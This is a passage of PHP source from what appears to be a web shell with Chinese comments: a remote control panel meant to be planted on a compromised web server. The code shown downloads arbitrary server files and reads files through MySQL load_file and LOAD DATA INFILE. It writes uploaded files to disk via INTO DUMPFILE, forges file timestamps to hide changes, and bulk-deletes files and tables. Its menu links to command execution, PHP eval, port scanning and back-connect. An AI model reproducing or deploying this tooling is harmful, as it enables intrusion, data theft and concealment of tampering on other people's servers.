                phpinfo();
                exit;
            } else {
                $errmsg = 'phpinfo() function has non-permissible';
            }
        }
        
        // 下载文件
        if ($doing == 'downfile' && $thefile) {
            if (!@file_exists($thefile)) {
                $errmsg = 'The file you want Downloadable was nonexistent';
            } else {
                $fileinfo = pathinfo($thefile);
                header('Content-type: application/x-'.$fileinfo['extension']);
                header('Content-Disposition: attachment; filename='.$fileinfo['basename']);
                header('Content-Length: '.filesize($thefile));
                @readfile($thefile);
                exit;
            }
        }
        
        // 直接下载备份数据库
        if ($doing == 'backupmysql' && !$saveasfile) {
            if (!$table) {
                $errmsg ='Please choose the table';
            } else {
                $mysqllink = mydbconn($dbhost, $dbuser, $dbpass, $dbname, $charset, $dbport);
                $filename = basename($dbname.'.sql');
                header('Content-type: application/unknown');
                header('Content-Disposition: attachment; filename='.$filename);
                foreach($table as $k => $v) {
                    if ($v) {
                        sqldumptable($v);
                    }
                }
                mysql_close();
                exit;
            }
        }
        
        // 通过MYSQL下载文件
        if($doing=='mysqldown'){
            if (!$dbname) {
                $errmsg = 'Please input dbname';
            } else {
                $mysqllink = mydbconn($dbhost, $dbuser, $dbpass, $dbname, $charset, $dbport);
                if (!file_exists($mysqldlfile)) {
                    $errmsg = 'The file you want Downloadable was nonexistent';
                } else {
                    $result = q("select load_file('$mysqldlfile');");
                    if(!$result){
                        q("DROP TABLE IF EXISTS tmp_angel;");
                        q("CREATE TABLE tmp_angel (content LONGBLOB NOT NULL);");
                        //用时间戳来表示截断,避免出现读取自身或包含__angel_1111111111_eof__的文件时不完整的情况
                        q("LOAD DATA LOCAL INFILE '".addslashes($mysqldlfile)."' INTO TABLE tmp_angel FIELDS TERMINATED BY '__angel_{$timestamp}_eof__' ESCAPED BY '' LINES TERMINATED BY '__angel_{$timestamp}_eof__';");
                        $result = q("select content from tmp_angel");
                        q("DROP TABLE tmp_angel");
                    }
                    $row = @mysql_fetch_array($result);
                    if (!$row) {
                        $errmsg = 'Load file failed '.mysql_error();
                    } else {
                        $fileinfo = pathinfo($mysqldlfile);
                        header('Content-type: application/x-'.$fileinfo['extension']);
                        header('Content-Disposition: attachment; filename='.$fileinfo['basename']);
                        header("Accept-Length: ".strlen($row[0]));
                        echo $row[0];
                        exit;
                    }
                }
            }
        }
        
        ?>
        <html>
        <head>
        <meta http-equiv="Content-Type" content="text/html; charset=gbk">
        <title><?php echo $action.' - '.$_SERVER['HTTP_HOST'];?></title>
        <style type="text/css">
        body,td{font: 12px Arial,Tahoma;line-height: 16px;}
        .input{font:12px Arial,Tahoma;background:#fff;border: 1px solid #666;padding:2px;height:22px;}
        .area{font:12px 'Courier New', Monospace;background:#fff;border: 1px solid #666;padding:2px;}
        .bt {border-color:#b0b0b0;background:#3d3d3d url(http://t.cn/zRymOgc);color:#ffffff;font:12px Arial,Tahoma;height:22px;}
        a {color: #00f;text-decoration:underline;}
        a:hover{color: #f00;text-decoration:none;}
        .alt1 td{border-top:1px solid #fff;border-bottom:1px solid #ddd;background:#f1f1f1;padding:5px 15px 5px 5px;}
        .alt2 td{border-top:1px solid #fff;border-bottom:1px solid #ddd;background:#f9f9f9;padding:5px 15px 5px 5px;}
        .focus td{border-top:1px solid #fff;border-bottom:1px solid #ddd;background:#ffffaa;padding:5px 15px 5px 5px;}
        .head td{border-top:1px solid #fff;border-bottom:1px solid #ddd;background:#e9e9e9;padding:5px 15px 5px 5px;font-weight:bold;}
        .head td span{font-weight:normal;}
        .infolist {padding:10px;margin:10px 0 20px 0;background:#F1F1F1;border:1px solid #ddd;}
        form{margin:0;padding:0;}
        h2{margin:0;padding:0;height:24px;line-height:24px;font-size:14px;color:#5B686F;}
        ul.info li{margin:0;color:#444;line-height:24px;height:24px;}
        u{text-decoration: none;color:#777;float:left;display:block;width:150px;margin-right:10px;}
        .drives{padding:5px;}
        .drives span {margin:auto 7px;}
        </style>
        <script type="text/javascript">
        function CheckAll(form) {
            for(var i=0;i<form.elements.length;i++) {
                var e = form.elements[i];
                if (e.name != 'chkall')
                e.checked = form.chkall.checked;
            }
        }
        function $(id) {
            return document.getElementById(id);
        }
        function createdir(){
            var newdirname;
            newdirname = prompt('Please input the directory name:', ''  );
            if (!newdirname) return;
            $('createdir').newdirname.value=newdirname;
            $('createdir').submit();
        }
        function fileperm(pfile){
            var newperm;
            newperm = prompt('Current file:'+pfile+'\nPlease input new attribute:', '');
            if (!newperm) return;
            $('fileperm').newperm.value=newperm;
            $('fileperm').pfile.value=pfile;
            $('fileperm').submit();
        }
        function copyfile(sname){
            var tofile;
            tofile = prompt('Original file:'+sname+'\nPlease input object file (fullpath):', '');
            if (!tofile) return;
            $('copyfile').tofile.value=tofile;
            $('copyfile').sname.value=sname;
            $('copyfile').submit();
        }
        function rename(oldname){
            var newfilename;
            newfilename = prompt('Former file name:'+oldname+'\nPlease input new filename:', '');
            if (!newfilename) return;
            $('rename').newfilename.value=newfilename;
            $('rename').oldname.value=oldname;
            $('rename').submit();
        }
        function dofile(doing,thefile,m){
            if (m && !confirm(m)) {
                return;
            }
            $('filelist').doing.value=doing;
            if (thefile){
                $('filelist').thefile.value=thefile;
            }
            $('filelist').submit();
        }
        function createfile(nowpath){
            var filename;
            filename = prompt('Please input the file name:', '');
            if (!filename) return;
            opfile('editfile',nowpath + filename,nowpath);
        }
        function opfile(action,opfile,dir){
            $('fileopform').action.value=action;
            $('fileopform').opfile.value=opfile;
            $('fileopform').dir.value=dir;
            $('fileopform').submit();
        }
        function godir(dir,view_writable){
            if (view_writable) {
                $('godir').view_writable.value=view_writable;
            }
            $('godir').dir.value=dir;
            $('godir').submit();
        }
        function getsize(getdir,dir){
            $('getsize').getdir.value=getdir;
            $('getsize').dir.value=dir;
            $('getsize').submit();
        }
        function editrecord(action, base64, tablename){
            if (action == 'del') {      
                if (!confirm('Is or isn\'t deletion record?')) return;
            }
            $('recordlist').doing.value=action;
            $('recordlist').base64.value=base64;
            $('recordlist').tablename.value=tablename;
            $('recordlist').submit();
        }
        function moddbname(dbname) {
            if(!dbname) return;
            $('setdbname').dbname.value=dbname;
            $('setdbname').submit();
        }
        function settable(tablename,doing,page) {
            if(!tablename) return;
            if (doing) {
                $('settable').doing.value=doing;
            }
            if (page) {
                $('settable').page.value=page;
            }
            $('settable').tablename.value=tablename;
            $('settable').submit();
        }
        function s(action,nowpath,p1,p2,p3,p4,p5) {
            if(action) $('opform').action.value=action;
            if(nowpath) $('opform').nowpath.value=nowpath;
            if(p1) $('opform').p1.value=p1;
            if(p2) $('opform').p2.value=p2;
            if(p3) $('opform').p3.value=p3;
            if(p4) $('opform').p4.value=p4;
            if(p5) $('opform').p4.value=p5;
        }
        function g(action,nowpath,p1,p2,p3,p4,p5) {
            if(!action) return;
            s(action,nowpath,p1,p2,p3,p4,p5);
            $('opform').submit();
        }
        </script>
        </head>
        <body style="margin:0;table-layout:fixed; word-break:break-all">
        <?php
        formhead(array('name'=>'opform'));
        makehide('action', $action);
        makehide('nowpath', $nowpath);
        makehide('p1', $p1);
        makehide('p2', $p2);
        makehide('p3', $p3);
        makehide('p4', $p4);
        makehide('p5', $p5);
        formfoot();
        
        if(!function_exists('posix_getegid')) {
            $user = @get_current_user();
            $uid = @getmyuid();
            $gid = @getmygid();
            $group = "?";
        } else {
            $uid = @posix_getpwuid(@posix_geteuid());
            $gid = @posix_getgrgid(@posix_getegid());
            $user = $uid['name'];
            $uid = $uid['uid'];
            $group = $gid['name'];
            $gid = $gid['gid'];
        }
        
        ?>
        <table width="100%" border="0" cellpadding="0" cellspacing="0">
            <tr class="head">
                <td><span style="float:right;"><?php echo @php_uname();?> / User:<?php echo $uid.' ( '.$user.' ) / Group: '.$gid.' ( '.$group.' )';?></span><?php echo $_SERVER['HTTP_HOST'];?> (<?php echo gethostbyname($_SERVER['SERVER_NAME']);?>)</td>
            </tr>
            <tr class="alt1">
                <td>
                    <span style="float:right;">PHP <?php echo PHP_VERSION;?> / Safe Mode:<?php echo getcfg('safe_mode');?></span>
                    <a href="javascript:g('logout');">Logout</a> | 
                    <a href="javascript:g('file');">File Manager</a> | 
                    <a href="javascript:g('mysqladmin');">MYSQL Manager</a> | 
                    <a href="javascript:g('sqlfile');">MySQL Upload &amp; Download</a> | 
                    <a href="javascript:g('shell');">Execute Command</a> | 
                    <a href="javascript:g('phpenv');">PHP Variable</a> | 
                    <a href="javascript:g('portscan');">Port Scan</a> | 
                    <a href="javascript:g('secinfo');">Security information</a> | 
                    <a href="javascript:g('eval');">Eval PHP Code</a>
                    <?php if (!IS_WIN) {?> | <a href="javascript:g('backconnect');">Back Connect</a><?php }?>
                </td>
            </tr>
        </table>
        <table width="100%" border="0" cellpadding="15" cellspacing="0"><tr><td>
        <?php
        $errmsg && m($errmsg);
        
        // 获取当前路径
        if (!$dir) {
            $dir = $_SERVER["DOCUMENT_ROOT"] ? $_SERVER["DOCUMENT_ROOT"] : '.';
        }
        $nowpath = getPath(SA_ROOT, $dir);
        if (substr($dir, -1) != '/') {
            $dir = $dir.'/';
        }
        
        if ($action == 'file') {
        
            // 判断读写情况
            $dir_writeable = @is_writable($nowpath) ? 'Writable' : 'Non-writable';
        
            // 创建目录
            if ($newdirname) {
                $mkdirs = $nowpath.$newdirname;
                if (file_exists($mkdirs)) {
                    m('Directory has already existed');
                } else {
                    m('Directory created '.(@mkdir($mkdirs,0777) ? 'success' : 'failed'));
                    @chmod($mkdirs,0777);
                }
            }
        
            // 上传文件
            elseif ($doupfile) {
                m('File upload '.(@copy($_FILES['uploadfile']['tmp_name'],$uploaddir.'/'.$_FILES['uploadfile']['name']) ? 'success' : 'failed'));
            }
        
            // 编辑文件
            elseif ($editfilename && $filecontent) {
                $fp = @fopen($editfilename,'w');
                m('Save file '.(@fwrite($fp,$filecontent) ? 'success' : 'failed'));
                @fclose($fp);
            }
        
            // 编辑文件属性
            elseif ($pfile && $newperm) {
                if (!file_exists($pfile)) {
                    m('The original file does not exist');
                } else {
                    $newperm = base_convert($newperm,8,10);
                    m('Modify file attributes '.(@chmod($pfile,$newperm) ? 'success' : 'failed'));
                }
            }
        
            // 改名
            elseif ($oldname && $newfilename) {
                $nname = $nowpath.$newfilename;
                if (file_exists($nname) || !file_exists($oldname)) {
                    m($nname.' has already existed or original file does not exist');
                } else {
                    m(basename($oldname).' renamed '.basename($nname).(@rename($oldname,$nname) ? ' success' : 'failed'));
                }
            }
        
            // 复制文件
            elseif ($sname && $tofile) {
                if (file_exists($tofile) || !file_exists($sname)) {
                    m('The goal file has already existed or original file does not exist');
                } else {
                    m(basename($tofile).' copied '.(@copy($sname,$tofile) ? basename($tofile).' success' : 'failed'));
                }
            }
        
            // 克隆时间
            elseif ($curfile && $tarfile) {
                if (!@file_exists($curfile) || !@file_exists($tarfile)) {
                    m('The goal file has already existed or original file does not exist');
                } else {
                    $time = @filemtime($tarfile);
                    m('Modify file the last modified '.(@touch($curfile,$time,$time) ? 'success' : 'failed'));
                }
            }
        
            // 自定义时间
            elseif ($curfile && $year && $month && $day && $hour && $minute && $second) {
                if (!@file_exists($curfile)) {
                    m(basename($curfile).' does not exist');
                } else {
                    $time = strtotime("$year-$month-$day $hour:$minute:$second");
                    m('Modify file the last modified '.(@touch($curfile,$time,$time) ? 'success' : 'failed'));
                }
            }
        
            // 批量删除文件
            elseif($doing == 'delfiles') {
                if ($dl) {
                    $dfiles='';
                    $succ = $fail = 0;
                    foreach ($dl as $filepath) {
                        if (is_dir($filepath)) {
                            if (@deltree($filepath)) {
                                $succ++;
                            } else {
                                $fail++;
                            }
                        } else {
                            if (@unlink($filepath)) {
                                $succ++;
                            } else {
                                $fail++;
                            }
                        }
                    }
                    m('Deleted folder/file have finished,choose '.count($dl).' success '.$succ.' fail '.$fail);
                } else {
                    m('Please select folder/file(s)');
                }
            }
        
            //操作完毕
            formhead(array('name'=>'createdir'));
            makehide('newdirname');
            makehide('dir',$nowpath);
            formfoot();
            formhead(array('name'=>'fileperm'));
            makehide('newperm');
            makehide('pfile');
            makehide('dir',$nowpath);
            formfoot();
            formhead(array('name'=>'copyfile'));
            makehide('sname');
            makehide('tofile');
            makehide('dir',$nowpath);
            formfoot();
            formhead(array('name'=>'rename'));
            makehide('oldname');
            makehide('newfilename');
            makehide('dir',$nowpath);
            formfoot();
            formhead(array('name'=>'fileopform', 'target'=>'_blank'));
            makehide('action');
            makehide('opfile');
            makehide('dir');
            formfoot();
            formhead(array('name'=>'getsize'));
            makehide('getdir');
            makehide('dir');
            formfoot();
        
            $free = @disk_free_space($nowpath);
            !$free && $free = 0;
            $all = @disk_total_space($nowpath);
            !$all && $all = 0;
            $used = $all-$free;
            p('<h2>File Manager - Current disk free '.sizecount($free).' of '.sizecount($all).' ('.@round(100/($all/$free),2).'%)</h2>');
        
            $cwd_links = '';
            $path = explode('/', $nowpath);
            $n=count($path);
            for($i=0;$i<$n-1;$i++) {
                $cwd_links .= '<a href="javascript:godir(\'';
                for($j=0;$j<=$i;$j++) {
                    $cwd_links .= $path[$j].'/';
                }
                $cwd_links .= '\');">'.$path[$i].'/</a>';
            }
        
        ?>
        <script type="text/javascript">
        document.onclick = shownav;
        function shownav(e){
            var src = e?e.target:event.srcElement;
            do{
                if(src.id =="jumpto") {
                    $('inputnav').style.display = "";
                    $('pathnav').style.display = "none";
                    //hidenav();
                    return;
                }
                if(src.id =="inputnav") {
                    return;
                }
                src = src.parentNode;
            }while(src.parentNode)
        
            $('inputnav').style.display = "none";
            $('pathnav').style.display = "";
        }
        </script>
        <div style="background:#eee;margin-bottom:10px;">
            <table id="pathnav" width="100%" border="0" cellpadding="5" cellspacing="0">
                <tr>
                    <td width="100%"><?php echo $cwd_links.' - '.getChmod($nowpath).' / '.getPerms($nowpath).getUser($nowpath);?> (<?php echo $dir_writeable;?>)</td>
                    <td nowrap><input class="bt" id="jumpto" name="jumpto" value="Jump to" type="button"></td>
                </tr>
            </table>
            <table id="inputnav" width="100%" border="0" cellpadding="5" cellspacing="0" style="display:none;">
            <form action="" method="post" id="godir" name="godir">
                <tr>
                    <td nowrap>Current Directory (<?php echo $dir_writeable;?>, <?php echo getChmod($nowpath);?>)</td>
                    <td width="100%"><input name="view_writable" value="0" type="hidden" /><input class="input" name="dir" value="<?php echo $nowpath;?>" type="text" style="width:99%;margin:0 8px;"></td>
                    <td nowrap><input class="bt" value="GO" type="submit"></td>
                </tr>
            </form>
            </table>
        <?php
            if (IS_WIN && IS_COM) {
                $obj = new COM('scripting.filesystemobject');
                if ($obj && is_object($obj) && $obj->Drives) {
                    echo '<div class="drives">';
                    $DriveTypeDB = array(0 => 'Unknow',1 => 'Removable',2 => 'Fixed',3 => 'Network',4 => 'CDRom',5 => 'RAM Disk');
                    $comma = '';
                    foreach($obj->Drives as $drive) {
                        if ($drive->Path) {
                            p($comma.'<a href="javascript:godir(\''.$drive->Path.'/\');">'.$DriveTypeDB[$drive->DriveType].'('.$drive->Path.')</a>');
                            $comma = '<span>|</span>';
                        }
                    }
                    echo '</div>';
                }
            }
        ?>
        </div>
        <?php
            $findstr = $_POST['findstr'];
            $re = $_POST['re'];
            tbhead();
            p('<tr class="alt1"><td colspan="7" style="padding:5px;line-height:20px;">');
            p('<form action="'.$self.'" method="POST" enctype="multipart/form-data"><div style="float:right;"><input class="input" name="uploadfile" value="" type="file" /> <input class="bt" name="doupfile" value="Upload" type="submit" /><input name="uploaddir" value="'.$nowpath.'" type="hidden" /><input name="dir" value="'.$nowpath.'" type="hidden" /></div></form>');
            p('<a href="javascript:godir(\''.$_SERVER["DOCUMENT_ROOT"].'\');">WebRoot</a>');
            p(' | <a href="javascript:godir(\'.\');">ScriptPath</a>');
            p(' | <a href="javascript:godir(\''.$nowpath.'\');">View All</a>');
            p(' | View Writable ( <a href="javascript:godir(\''.$nowpath.'\',\'dir\');">Directory</a>');
            p(' | <a href="javascript:godir(\''.$nowpath.'\',\'file\');">File</a> )');
            p(' | <a href="javascript:createdir();">Create Directory</a> | <a href="javascript:createfile(\''.$nowpath.'\');">Create File</a>');
        
            p('<div style="padding:5px 0;"><form action="'.$self.'" method="POST">Find string in files(current folder): <input class="input" name="findstr" value="'.$findstr.'" type="text" /> <input class="bt" value="Find" type="submit" /> Type: <input class="input" name="writabledb" value="'.$writabledb.'" type="text" /><input name="dir" value="'.$dir.'" type="hidden" /> <input name="re" value="1" type="checkbox" '.($re ? 'checked' : '').' /> Regular expressions</form></div></td></tr>');
        
            p('<tr class="head"><td>&nbsp;</td><td>Filename</td><td width="16%">Last modified</td><td width="10%">Size</td><td width="20%">Chmod / Perms</td><td width="22%">Action</td></tr>');
        
            //查看所有可写文件和目录
            $dirdata=array();
            $filedata=array();
        
            if ($view_writable == 'dir') {
                $dirdata = GetWDirList($nowpath);
                $filedata = array();
            } elseif ($view_writable == 'file') {
                $dirdata = array();
                $filedata = GetWFileList($nowpath);
            } elseif ($findstr) {
                $dirdata = array();
                $filedata = GetSFileList($nowpath, $findstr, $re);
            } else {
                // 目录列表
                //scandir()效率更高
                $dirs=@opendir($dir);
                while ($file=@readdir($dirs)) {
                    $filepath=$nowpath.$file;
                    if(@is_dir($filepath)){
                        $dirdb['filename']=$file;
                        $dirdb['mtime']=@date('Y-m-d H:i:s',filemtime($filepath));
                        $dirdb['dirchmod']=getChmod($filepath);
                        $dirdb['dirperm']=getPerms($filepath);
                        $dirdb['fileowner']=getUser($filepath);
                        $dirdb['dirlink']=$nowpath;
                        $dirdb['server_link']=$filepath;
                        $dirdata[]=$dirdb;
                    } else {        
                        $filedb['filename']=$file;
                        $filedb['size']=sizecount(@filesize($filepath));
                        $filedb['mtime']=@date('Y-m-d H:i:s',filemtime($filepath));
                        $filedb['filechmod']=getChmod($filepath);
                        $filedb['fileperm']=getPerms($filepath);
                        $filedb['fileowner']=getUser($filepath);
                        $filedb['dirlink']=$nowpath;
                        $filedb['server_link']=$filepath;
                        $filedata[]=$filedb;
                    }
                }// while
                unset($dirdb);
                unset($filedb);
                @closedir($dirs);
            }
            @sort($dirdata);
            @sort($filedata);
            $dir_i = '0';
        
            p('<form id="filelist" name="filelist" action="'.$self.'" method="post">');
            makehide('action','file');
            makehide('thefile');
            makehide('doing');
            makehide('dir',$nowpath);
        
            foreach($dirdata as $key => $dirdb){
                if($dirdb['filename']!='..' && $dirdb['filename']!='.') {
                    if($getdir && $getdir == $dirdb['server_link']) {
                        $attachsize = dirsize($dirdb['server_link']);
                        $attachsize = is_numeric($attachsize) ? sizecount($attachsize) : 'Unknown';
                    } else {
                        $attachsize = '<a href="javascript:getsize(\''.$dirdb['server_link'].'\',\''.$dir.'\');">Stat</a>';
                    }
                    $thisbg = bg();
                    p('<tr class="'.$thisbg.'" onmouseover="this.className=\'focus\';" onmouseout="this.className=\''.$thisbg.'\';">');
                    p('<td width="2%" nowrap><input name="dl[]" type="checkbox" value="'.$dirdb['server_link'].'"></td>');
                    p('<td><a href="javascript:godir(\''.$dirdb['server_link'].'\');">'.$dirdb['filename'].'</a></td>');
                    p('<td nowrap><a href="javascript:opfile(\'newtime\',\''.$dirdb['server_link'].'\',\''.$dirdb['dirlink'].'\');">'.$dirdb['mtime'].'</a></td>');
                    p('<td nowrap>'.$attachsize.'</td>');
                    p('<td nowrap>');
                    p('<a href="javascript:fileperm(\''.$dirdb['server_link'].'\');">'.$dirdb['dirchmod'].'</a> / ');
                    p('<a href="javascript:fileperm(\''.$dirdb['server_link'].'\');">'.$dirdb['dirperm'].'</a>'.$dirdb['fileowner'].'</td>');
                    p('<td nowrap><a href="javascript:rename(\''.$dirdb['server_link'].'\');">Rename</a></td>');
                    p('</tr>');
                    $dir_i++;
                } else {
                    if($dirdb['filename']=='..') {
                        p('<tr class='.bg().'>');
                        p('<td align="center">-</td><td nowrap colspan="5"><a href="javascript:godir(\''.getUpPath($nowpath).'\');">Parent Directory</a></td>');
                        p('</tr>');
                    }
                }
            }
        
            p('<tr bgcolor="#dddddd" stlye="border-top:1px solid #fff;border-bottom:1px solid #ddd;"><td colspan="6" height="5"></td></tr>');
            $file_i = '0';
        
            foreach($filedata as $key => $filedb){
                if($filedb['filename']!='..' && $filedb['filename']!='.') {
                    $fileurl = str_replace($_SERVER["DOCUMENT_ROOT"],'',$filedb['server_link']);
                    $thisbg = bg();
                    p('<tr class="'.$thisbg.'" onmouseover="this.className=\'focus\';" onmouseout="this.className=\''.$thisbg.'\';">');
                    p('<td width="2%" nowrap><input name="dl[]" type="checkbox" value="'.$filedb['server_link'].'"></td>');
                    p('<td>'.((strpos($filedb['server_link'], $_SERVER["DOCUMENT_ROOT"]) !== false) ? '<a href="'.$fileurl.'" target="_blank">'.$filedb['filename'].'</a>' : $filedb['filename']).'</td>');
                    p('<td nowrap><a href="javascript:opfile(\'newtime\',\''.$filedb['server_link'].'\',\''.$filedb['dirlink'].'\');">'.$filedb['mtime'].'</a></td>');
                    p('<td nowrap>'.$filedb['size'].'</td>');
                    p('<td nowrap>');
                    p('<a href="javascript:fileperm(\''.$filedb['server_link'].'\');">'.$filedb['filechmod'].'</a> / ');
                    p('<a href="javascript:fileperm(\''.$filedb['server_link'].'\');">'.$filedb['fileperm'].'</a>'.$filedb['fileowner'].'</td>');
                    p('<td nowrap>');
                    p('<a href="javascript:dofile(\'downfile\',\''.$filedb['server_link'].'\');">Down</a> | ');
                    p('<a href="javascript:copyfile(\''.$filedb['server_link'].'\');">Copy</a> | ');
                    p('<a href="javascript:opfile(\'editfile\',\''.$filedb['server_link'].'\',\''.$filedb['dirlink'].'\');">Edit</a> | ');
                    p('<a href="javascript:rename(\''.$filedb['server_link'].'\');">Rename</a>');
                    p('</td></tr>');
                    $file_i++;
                }
            }
            p('<tr class="head"><td>&nbsp;</td><td>Filename</td><td width="16%">Last modified</td><td width="10%">Size</td><td width="20%">Chmod / Perms</td><td width="22%">Action</td></tr>');
            p('<tr class="'.bg().'"><td align="center"><input name="chkall" value="on" type="checkbox" onclick="CheckAll(this.form)" /></td><td colspan="4"><a href="javascript:dofile(\'delfiles\');">Delete selected</a></td><td align="right">'.$dir_i.' directories / '.$file_i.' files</td></tr>');
            p('</form></table>');
        }// end dir
        
        elseif ($action == 'sqlfile') {
            if($doing=="mysqlupload"){
                $file = $_FILES['uploadfile'];
                $filename = $file['tmp_name'];
                if (file_exists($savepath)) {
                    m('The goal file has already existed');
                } else {
                    if(!$filename) {
                        m('Please choose a file');
                    } else {
                        $fp=@fopen($filename,'r');
                        $contents=@fread($fp, filesize($filename));
                        @fclose($fp);
                        $contents = bin2hex($contents);
                        if(!$upname) $upname = $file['name'];
                        $mysqllink = mydbconn($dbhost,$dbuser,$dbpass,$dbname,$charset,$dbport);
                        $result = q("SELECT 0x{$contents} FROM mysql.user INTO DUMPFILE '$savepath';");
                        m($result ? 'Upload success' : 'Upload has failed: '.mysql_error());
                    }
                }
            }
        ?>
        <script type="text/javascript">
        function mysqlfile(doing){
            if(!doing) return;
            $('doing').value=doing;
            $('mysqlfile').dbhost.value=$('dbinfo').dbhost.value;
            $('mysqlfile').dbport.value=$('dbinfo').dbport.value;
            $('mysqlfile').dbuser.value=$('dbinfo').dbuser.value;
            $('mysqlfile').dbpass.value=$('dbinfo').dbpass.value;
            $('mysqlfile').dbname.value=$('dbinfo').dbname.value;
            $('mysqlfile').charset.value=$('dbinfo').charset.value;
            $('mysqlfile').submit();
        }
        </script>
        <?php
            !$dbhost && $dbhost = 'localhost';
            !$dbuser && $dbuser = 'root';
            !$dbport && $dbport = '3306';
            formhead(array('title'=>'MYSQL Information','name'=>'dbinfo'));
            makehide('action','sqlfile');
            p('<p>');
            p('DBHost:');
            makeinput(array('name'=>'dbhost','size'=>20,'value'=>$dbhost));
            p(':');
            makeinput(array('name'=>'dbport','size'=>4,'value'=>$dbport));
            p('DBUser:');
            makeinput(array('name'=>'dbuser','size'=>15,'value'=>$dbuser));
            p('DBPass:');
            makeinput(array('name'=>'dbpass','size'=>15,'value'=>$dbpass));
            p('DBName:');
            makeinput(array('name'=>'dbname','size'=>15,'value'=>$dbname));
            p('DBCharset:');
            makeselect(array('name'=>'charset','option'=>$charsetdb,'selected'=>$charset,'nokey'=>1));
            p('</p>');
            formfoot();
            p('<form action="'.$self.'" method="POST" enctype="multipart/form-data" name="mysqlfile" id="mysqlfile">');
            p('<h2>Upload file</h2>');
            p('<p><b>This operation the DB user must has FILE privilege</b></p>');
            p('<p>Save path(fullpath): <input class="input" name="savepath" size="45" type="text" /> Choose a file: <input class="input" name="uploadfile" type="file" /> <a href="javascript:mysqlfile(\'mysqlupload\');">Upload</a></p>');
            p('<h2>Download file</h2>');
            p('<p>File: <input class="input" name="mysqldlfile" size="115" type="text" /> <a href="javascript:mysqlfile(\'mysqldown\');">Download</a></p>');
            makehide('dbhost');
            makehide('dbport');
            makehide('dbuser');
            makehide('dbpass');
            makehide('dbname');
            makehide('charset');
            makehide('doing');
            makehide('action','sqlfile');
            p('</form>');
        }
        
        elseif ($action == 'mysqladmin') {
            !$dbhost && $dbhost = 'localhost';
            !$dbuser && $dbuser = 'root';
            !$dbport && $dbport = '3306';
            $dbform = '<input type="hidden" id="connect" name="connect" value="1" />';
            if(isset($dbhost)){
                $dbform .= "<input type=\"hidden\" id=\"dbhost\" name=\"dbhost\" value=\"$dbhost\" />\n";
            }
            if(isset($dbuser)) {
                $dbform .= "<input type=\"hidden\" id=\"dbuser\" name=\"dbuser\" value=\"$dbuser\" />\n";
            }
            if(isset($dbpass)) {
                $dbform .= "<input type=\"hidden\" id=\"dbpass\" name=\"dbpass\" value=\"$dbpass\" />\n";
            }
            if(isset($dbport)) {
                $dbform .= "<input type=\"hidden\" id=\"dbport\" name=\"dbport\" value=\"$dbport\" />\n";
            }
            if(isset($dbname)) {
                $dbform .= "<input type=\"hidden\" id=\"dbname\" name=\"dbname\" value=\"$dbname\" />\n";
            }
            if(isset($charset)) {
                $dbform .= "<input type=\"hidden\" id=\"charset\" name=\"charset\" value=\"$charset\" />\n";
            }
        
            if ($doing == 'backupmysql' && $saveasfile) {
                if (!$table) {
                    m('Please choose the table');
                } else {
                    $mysqllink = mydbconn($dbhost,$dbuser,$dbpass,$dbname,$charset,$dbport);
                    $fp = @fopen($path,'w');
                    if ($fp) {
                        foreach($table as $k => $v) {
                            if ($v) {
                                sqldumptable($v, $fp);
                            }
                        }
                        fclose($fp);                
                        $fileurl = str_replace(SA_ROOT,'',$path);
                        m('Database has success backup to <a href="'.$fileurl.'" target="_blank">'.$path.'</a>');
                        mysql_close();
                    } else {
                        m('Backup failed');
                    }
                }
            }
            if ($insert && $insertsql) {
                $keystr = $valstr = $tmp = '';
                foreach($insertsql as $key => $val) {
                    if ($val) {
                        $keystr .= $tmp.$key;
                        $valstr .= $tmp."'".addslashes($val)."'";
                        $tmp = ',';
                    }
                }
                if ($keystr && $valstr) {
                    $mysqllink = mydbconn($dbhost,$dbuser,$dbpass,$dbname,$charset,$dbport);
                    m(q("INSERT INTO $tablename ($keystr) VALUES ($valstr)") ? 'Insert new record of success' : mysql_error());
                }
            }
            if ($update && $insertsql && $base64) {
                $valstr = $tmp = '';
                foreach($insertsql as $key => $val) {
                    $valstr .= $tmp.$key."='".addslashes($val)."'";
                    $tmp = ',';
                }
                if ($valstr) {
                    $where = base64_decode($base64);
                    $mysqllink = mydbconn($dbhost,$dbuser,$dbpass,$dbname,$charset,$dbport);
                    m(q("UPDATE $tablename SET $valstr WHERE $where LIMIT 1") ? 'Record updating' : mysql_error());
                }
            }
            if ($doing == 'del' && $base64) {
                $where = base64_decode($base64);
                $delete_sql = "DELETE FROM $tablename WHERE $where";
                $mysqllink = mydbconn($dbhost,$dbuser,$dbpass,$dbname,$charset,$dbport);
                m(q("DELETE FROM $tablename WHERE $where") ? 'Deletion record of success' : mysql_error());
            }
        
            if ($tablename && $doing == 'drop') {
                $mysqllink = mydbconn($dbhost,$dbuser,$dbpass,$dbname,$charset,$dbport);
                if (q("DROP TABLE $tablename")) {
                    m('Drop table of success');
                    $tablename = '';
                } else {
                    m(mysql_error());
                }
            }
        
            formhead(array('title'=>'MYSQL Manager'));
            makehide('action','mysqladmin');
            p('<p>');
            p('DBHost:');
            makeinput(array('name'=>'dbhost','size'=>20,'value'=>$dbhost));
            p(':');
            makeinput(array('name'=>'dbport','size'=>4,'value'=>$dbport));
            p('DBUser:');
            makeinput(array('name'=>'dbuser','size'=>15,'value'=>$dbuser));
            p('DBPass:');
            makeinput(array('name'=>'dbpass','size'=>15,'value'=>$dbpass));
            p('DBCharset:');
            makeselect(array('name'=>'charset','option'=>$charsetdb,'selected'=>$charset,'nokey'=>1));
            makeinput(array('name'=>'connect','value'=>'Connect','type'=>'submit','class'=>'bt'));
            p('</p>');
            formfoot();
        
            //操作记录
            formhead(array('name'=>'recordlist'));
            makehide('doing');
            makehide('action','mysqladmin');
            makehide('base64');
            makehide('tablename');
            p($dbform);
            formfoot();
        
            //选定数据库
            formhead(array('name'=>'setdbname'));
            makehide('action','mysqladmin');
            p($dbform);
            if (!$dbname) {
                makehide('dbname');
            }
            formfoot();
        
            //选定表
            formhead(array('name'=>'settable'));
            makehide('action','mysqladmin');
            p($dbform);
            makehide('tablename');
            makehide('page',$page);
            makehide('doing');
            formfoot();
        
            $cachetables = array();     
            $pagenum = 30;
            $page = intval($page);
            if($page) {
                $start_limit = ($page - 1) * $pagenum;
            } else {
                $start_limit = 0;
                $page = 1;
            }
            if (isset($dbhost) && isset($dbuser) && isset($dbpass) && isset($connect)) {
                $mysqllink = mydbconn($dbhost, $dbuser, $dbpass, $dbname, $charset, $dbport);
                //获取数据库信息
                $mysqlver = mysql_get_server_info();
                p('<p>MySQL '.$mysqlver.' running in '.$dbhost.' as '.$dbuser.'@'.$dbhost.'</p>');
                $highver = $mysqlver > '4.1' ? 1 : 0;
        
                //获取数据库
